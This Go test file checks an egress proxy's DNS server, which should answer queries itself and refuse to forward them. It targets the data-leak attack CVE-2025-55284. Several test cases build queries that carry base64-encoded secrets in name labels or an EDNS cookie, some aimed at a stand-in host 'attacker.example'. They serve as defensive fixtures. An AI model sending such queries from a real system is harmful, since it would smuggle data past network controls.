package egress

import (
	"net"
	"net/netip"
	"strings"
	"testing"
	"time"

	"golang.org/x/net/dns/dnsmessage"
)

// creDNSProxy is the proxy's address in the DNS tests.
var creDNSProxy = netip.MustParseAddr("10.9.8.7")

// creDNSQuery builds one query; edit changes its header or adds records.
func creDNSQuery(t *testing.T, name string, typ dnsmessage.Type, class dnsmessage.Class, edit func(h *dnsmessage.Header), extra func(b *dnsmessage.Builder)) []byte {
	t.Helper()
	h := dnsmessage.Header{ID: 0x5ea1, RecursionDesired: true}
	if edit != nil {
		edit(&h)
	}
	b := dnsmessage.NewBuilder(nil, h)
	b.StartQuestions()
	if err := b.Question(dnsmessage.Question{Name: dnsmessage.MustNewName(name), Type: typ, Class: class}); err != nil {
		t.Fatal(err)
	}
	if extra != nil {
		extra(&b)
	}
	q, err := b.Finish()
	if err != nil {
		t.Fatal(err)
	}
	return q
}

// creDNSAnswer answers a query as the proxy does, and checks what every
// answer must be: the question echoed, at most the proxy's own address,
// nothing else, and no larger than the question allows.
func creDNSAnswer(t *testing.T, query []byte) (dnsmessage.Message, bool) {
	t.Helper()
	out, ok := dnsAnswer(query, map[string]bool{"api.example.com": true}, creDNSProxy)
	if !ok {
		return dnsmessage.Message{}, false
	}
	var m dnsmessage.Message
	if err := m.Unpack(out); err != nil {
		t.Fatal(err)
	}
	if len(m.Authorities) != 0 || len(m.Additionals) != 0 || len(m.Questions) != 1 || len(m.Answers) > 1 {
		t.Errorf("an answer with more than a question and one address: %+v", m)
	}
	for _, a := range m.Answers {
		if r, ok := a.Body.(*dnsmessage.AResource); !ok || netip.AddrFrom4(r.A) != creDNSProxy {
			t.Errorf("an answer other than the proxy's address: %+v", a)
		}
	}
	if len(out) > len(query)+16 {
		t.Errorf("an answer of %d bytes to a query of %d", len(out), len(query))
	}
	return m, true
}

// creDNSLabels is a name under api.example.com carrying data in labels of
// the longest length DNS allows.
func creDNSLabels(n int) string {
	var labels []string
	for i := 0; i < n; i++ {
		labels = append(labels, strings.Repeat(string(rune('a'+i)), 63))
	}
	return strings.Join(labels, ".") + ".api.example.com."
}

// TestCreDNS: DNS carries nothing out. The proxy answers every query itself,
// with the proxy's address for an allowed name and nothing for any other,
// and never forwards one. The attack is CVE-2025-55284: data in the labels
// of a name the agent looks up.
func TestCreDNS(t *testing.T) {
	in := dnsmessage.ClassINET
	for _, c := range []struct {
		name  string
		query func(t *testing.T) []byte
		rcode dnsmessage.RCode
		ans   int
	}{
		{"CRE-038 data in the labels of an allowed name", func(t *testing.T) []byte {
			return creDNSQuery(t, "c2VjcmV0LWNvZGU.api.example.com.", dnsmessage.TypeA, in, nil, nil)
		}, dnsmessage.RCodeNameError, 0},
		{"CRE-038 the longest labels under an allowed name", func(t *testing.T) []byte {
			return creDNSQuery(t, creDNSLabels(3), dnsmessage.TypeA, in, nil, nil)
		}, dnsmessage.RCodeNameError, 0},
		{"CRE-038 data in a name of the attacker's", func(t *testing.T) []byte {
			return creDNSQuery(t, "c2VjcmV0.attacker.example.", dnsmessage.TypeA, in, nil, nil)
		}, dnsmessage.RCodeNameError, 0},
		{"CRE-038 an allowed name as a label of the attacker's", func(t *testing.T) []byte {
			return creDNSQuery(t, "api.example.com.attacker.example.", dnsmessage.TypeA, in, nil, nil)
		}, dnsmessage.RCodeNameError, 0},
		{"CRE-039 TXT for an allowed name", func(t *testing.T) []byte {
			return creDNSQuery(t, "api.example.com.", dnsmessage.TypeTXT, in, nil, nil)
		}, dnsmessage.RCodeSuccess, 0},
		{"CRE-039 TXT for the attacker's name", func(t *testing.T) []byte {
			return creDNSQuery(t, "c2VjcmV0.attacker.example.", dnsmessage.TypeTXT, in, nil, nil)
		}, dnsmessage.RCodeNameError, 0},
		{"CRE-039 MX for an allowed name", func(t *testing.T) []byte {
			return creDNSQuery(t, "api.example.com.", dnsmessage.TypeMX, in, nil, nil)
		}, dnsmessage.RCodeSuccess, 0},
		{"CRE-039 CNAME for an allowed name", func(t *testing.T) []byte {
			return creDNSQuery(t, "api.example.com.", dnsmessage.TypeCNAME, in, nil, nil)
		}, dnsmessage.RCodeSuccess, 0},
		{"CRE-039 SRV for an allowed name", func(t *testing.T) []byte {
			return creDNSQuery(t, "_https._tcp.api.example.com.", dnsmessage.TypeSRV, in, nil, nil)
		}, dnsmessage.RCodeNameError, 0},
		{"CRE-039 ANY for an allowed name", func(t *testing.T) []byte {
			return creDNSQuery(t, "api.example.com.", dnsmessage.TypeALL, in, nil, nil)
		}, dnsmessage.RCodeSuccess, 0},
		{"CRE-039 NS for an allowed name", func(t *testing.T) []byte {
			return creDNSQuery(t, "api.example.com.", dnsmessage.TypeNS, in, nil, nil)
		}, dnsmessage.RCodeSuccess, 0},
		{"CRE-039 HTTPS for an allowed name", func(t *testing.T) []byte {
			return creDNSQuery(t, "api.example.com.", dnsmessage.Type(65), in, nil, nil)
		}, dnsmessage.RCodeSuccess, 0},
		{"CRE-039 PTR for the proxy's address", func(t *testing.T) []byte {
			return creDNSQuery(t, "7.8.9.10.in-addr.arpa.", dnsmessage.TypePTR, in, nil, nil)
		}, dnsmessage.RCodeNameError, 0},
		{"CRE-040 the CHAOS class", func(t *testing.T) []byte {
			return creDNSQuery(t, "version.bind.", dnsmessage.TypeTXT, dnsmessage.ClassCHAOS, nil, nil)
		}, dnsmessage.RCodeNotImplemented, 0},
		{"CRE-040 an allowed name in the CHAOS class", func(t *testing.T) []byte {
			return creDNSQuery(t, "api.example.com.", dnsmessage.TypeA, dnsmessage.ClassCHAOS, nil, nil)
		}, dnsmessage.RCodeNotImplemented, 0},
		{"CRE-040 an update", func(t *testing.T) []byte {
			return creDNSQuery(t, "api.example.com.", dnsmessage.TypeA, in, func(h *dnsmessage.Header) { h.OpCode = 5 }, nil)
		}, dnsmessage.RCodeNotImplemented, 0},
		{"CRE-040 a notify", func(t *testing.T) []byte {
			return creDNSQuery(t, "api.example.com.", dnsmessage.TypeSOA, in, func(h *dnsmessage.Header) { h.OpCode = 4 }, nil)
		}, dnsmessage.RCodeNotImplemented, 0},
		{"CRE-041 EDNS with a large buffer and a client cookie", func(t *testing.T) []byte {
			return creDNSQuery(t, "c2VjcmV0.api.example.com.", dnsmessage.TypeA, in, nil, func(b *dnsmessage.Builder) {
				b.StartAdditionals()
				var opt dnsmessage.ResourceHeader
				opt.SetEDNS0(4096, dnsmessage.RCodeSuccess, true)
				b.OPTResource(opt, dnsmessage.OPTResource{Options: []dnsmessage.Option{{Code: 10, Data: []byte("c2VjcmV0")}}})
			})
		}, dnsmessage.RCodeNameError, 0},
		{"CRE-041 EDNS on an allowed name", func(t *testing.T) []byte {
			return creDNSQuery(t, "api.example.com.", dnsmessage.TypeA, in, nil, func(b *dnsmessage.Builder) {
				b.StartAdditionals()
				var opt dnsmessage.ResourceHeader
				opt.SetEDNS0(4096, dnsmessage.RCodeSuccess, false)
				b.OPTResource(opt, dnsmessage.OPTResource{})
			})
		}, dnsmessage.RCodeSuccess, 1},
		{"CRE-041 an allowed name with 0x20 case", func(t *testing.T) []byte {
			return creDNSQuery(t, "aPi.ExAmPlE.cOm.", dnsmessage.TypeA, in, nil, nil)
		}, dnsmessage.RCodeSuccess, 1},
	} {
		t.Run(c.name, func(t *testing.T) {
			m, ok := creDNSAnswer(t, c.query(t))
			if !ok {
				t.Fatal("no answer")
			}
			if m.Header.RCode != c.rcode || len(m.Answers) != c.ans || !m.Header.Response {
				t.Errorf("rcode %v with %d answers, want %v with %d", m.Header.RCode, len(m.Answers), c.rcode, c.ans)
			}
		})
	}

	// Packets that are not a query get no answer at all.
	for name, q := range map[string][]byte{
		"CRE-042 a response":       creDNSQuery(t, "api.example.com.", dnsmessage.TypeA, in, func(h *dnsmessage.Header) { h.Response = true }, nil),
		"CRE-042 no question":      {0x12, 0x34, 0x01, 0x00, 0, 0, 0, 0, 0, 0, 0, 0},
		"CRE-042 a truncated name": {0x12, 0x34, 0x01, 0x00, 0, 1, 0, 0, 0, 0, 0, 0, 63, 'a', 'b'},
		"CRE-042 a pointer loop":   {0x12, 0x34, 0x01, 0x00, 0, 1, 0, 0, 0, 0, 0, 0, 0xc0, 12, 0, 1, 0, 1},
		"CRE-042 garbage":          []byte("GET / HTTP/1.1\r\n\r\n"),
	} {
		t.Run(name, func(t *testing.T) {
			if _, ok := creDNSAnswer(t, q); ok {
				t.Error("answered")
			}
		})
	}
}

// TestCreDNSServeAnswersAlone runs the proxy's DNS server on a socket: a
// query for a name that is not allowed is answered at once, by the proxy,
// with no other resolver configured anywhere to forward to.
func TestCreDNSServeAnswersAlone(t *testing.T) {
	conn, err := net.ListenPacket("udp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { conn.Close() })
	go serveDNS(conn, map[string]bool{"api.example.com": true}, creDNSProxy)

	client, err := net.Dial("udp", conn.LocalAddr().String())
	if err != nil {
		t.Fatal(err)
	}
	defer client.Close()
	client.SetDeadline(time.Now().Add(5 * time.Second))
	for _, name := range []string{creDNSLabels(2), "c2VjcmV0.attacker.example."} {
		if _, err := client.Write(creDNSQuery(t, name, dnsmessage.TypeTXT, dnsmessage.ClassINET, nil, nil)); err != nil {
			t.Fatal(err)
		}
		buf := make([]byte, 1024)
		n, err := client.Read(buf)
		if err != nil {
			t.Fatal(err)
		}
		var m dnsmessage.Message
		if err := m.Unpack(buf[:n]); err != nil || m.Header.RCode != dnsmessage.RCodeNameError || len(m.Answers) != 0 {
			t.Errorf("%s: %v %+v", name, err, m.Header)
		}
	}
}
